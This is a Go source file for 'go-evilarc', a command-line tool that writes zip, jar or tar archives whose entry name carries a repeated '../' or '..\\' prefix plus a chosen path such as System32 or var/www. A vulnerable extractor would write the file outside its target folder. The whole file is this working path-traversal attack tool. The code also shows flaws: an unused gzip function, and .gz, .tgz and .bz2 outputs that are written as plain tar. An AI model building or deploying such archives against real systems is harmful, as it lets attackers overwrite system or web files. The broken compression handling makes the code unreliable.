package main

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"
	"time"
)

const version = "v0.0.1"

var (
	outputFile     string
	platform       string
	prePath        string
	customIterator string
	depth          int
)

func dozip(filename string, out *os.File, content []byte) {
	// Define ZipWriter writing to out file
	zw := zip.NewWriter(out)
	defer zw.Close()

	// Create file in zip archive with traversal
	zipContent, err := zw.Create(filename)
	if err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Write content of infile to that traversal file
	_, err = zipContent.Write(content)
	if err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Close zip writer
	if err = zw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func dotar(filename string, out *os.File, content []byte) {
	// Define TarWriter writing to out file
	tw := tar.NewWriter(out)
	defer tw.Close()

	// Construct header
	hdr := &tar.Header{
		Name:    filename,
		Mode:    int64(os.ModePerm),
		Size:    int64(len(content)),
		ModTime: time.Now(),
	}
	// Write header
	if err := tw.WriteHeader(hdr); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
	// Write content
	if _, err := tw.Write(content); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
	// Close TarWriter
	if err := tw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func dogz(filename string, out *os.File, content []byte) {
	// Define GzipWriter writing to out file
	gw := gzip.NewWriter(out)
	defer gw.Close()

	// Set Header
	gw.Name = filename
	gw.Comment = "How dare you"
	gw.ModTime = time.Date(1977, time.May, 25, 0, 0, 0, 0, time.UTC)

	// Write content
	if _, err := gw.Write(content); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Close GzipWriter
	if err := gw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func main() {
	var iterator string

	// Flags
	flag.StringVar(&outputFile, "out", "evil.zip", "")
	flag.StringVar(&platform, "platform", "win", "")
	flag.StringVar(&prePath, "path", "", "")
	flag.StringVar(&customIterator, "trav", "", "")
	flag.IntVar(&depth, "depth", 8, "")

	flag.Usage = func() {
		fmt.Printf("go-evilarc version %s\n", version)
		fmt.Println("Usage: go-evilarc <input file>")
		fmt.Println("")
		fmt.Println("Create archive containing a file with directory traversal")
		fmt.Println("")
		fmt.Println("Options:")
		fmt.Println("\t-out <filename>\t\tFile to output archive to. Archive type is based off of file extension.")
		fmt.Println("\t\t\t\tSupported extesions are zip, jar, tar, tar.bz2, tar.gz and tgz")
		fmt.Println("\t-depth <int>\t\tNumber of directories to traverse (default: 8)")
		fmt.Println("\t-platform [win|unix]\tOS platform for archive (default: win)")
		fmt.Println("\t-trav\t\t\tYou can define a custom traversal vector to use")
		fmt.Println("\t-path\t\t\tPath to include in filename after traversal.")
		fmt.Println("\t\t\t\tEx: WINDOWS\\\\System32\\\\ or var/www/")
	}
	flag.Parse()

	// Current working directory
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Check if input file provided
	if flag.NArg() == 0 {
		fmt.Println("You have to provide an input file as last argument")
		os.Exit(1)
	}

	// Read input file as last argument
	inputFile := os.Args[len(os.Args)-1]
	inputContent, err := ioutil.ReadFile(path.Join(cwd, inputFile))
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Switch over platform to check which iterator to use
	switch platform {
	case "win":
		iterator = "..\\"
	case "unix":
		iterator = "../"
	}

	// If there is a custom iterator use this instead
	if customIterator != "" {
		iterator = customIterator
	}

	// construct the out path
	// for usage as filename in archive
	outPath := fmt.Sprintf("%s%s%s", strings.Repeat(iterator, depth), prePath, inputFile)
	fmt.Printf("The filename in the archive will be: %s\n", outPath)

	// Create out file
	outFile, err := os.Create(outputFile)
	if err != nil {
		fmt.Println(err)
	}
	defer outFile.Close()

	// Switch over extension of output file
	ext := strings.Split(outputFile, ".")
	finalExt := ext[len(ext)-1]

	switch finalExt {
	case "zip":
		dozip(outPath, outFile, inputContent)
	case "jar":
		dozip(outPath, outFile, inputContent)
	case "tar":
		dotar(outPath, outFile, inputContent)
	case "gz":
		dotar(outPath, outFile, inputContent)
	case "tgz":
		dotar(outPath, outFile, inputContent)
	case "bz2":
		dotar(outPath, outFile, inputContent)
	default:
		fmt.Println("Could not identify target format. Choose from: .zip, .jar, .tar, .gz, .tgz, .bz2")
		os.Exit(1)
	}

	fmt.Printf("%s was written.\n", outputFile)
}
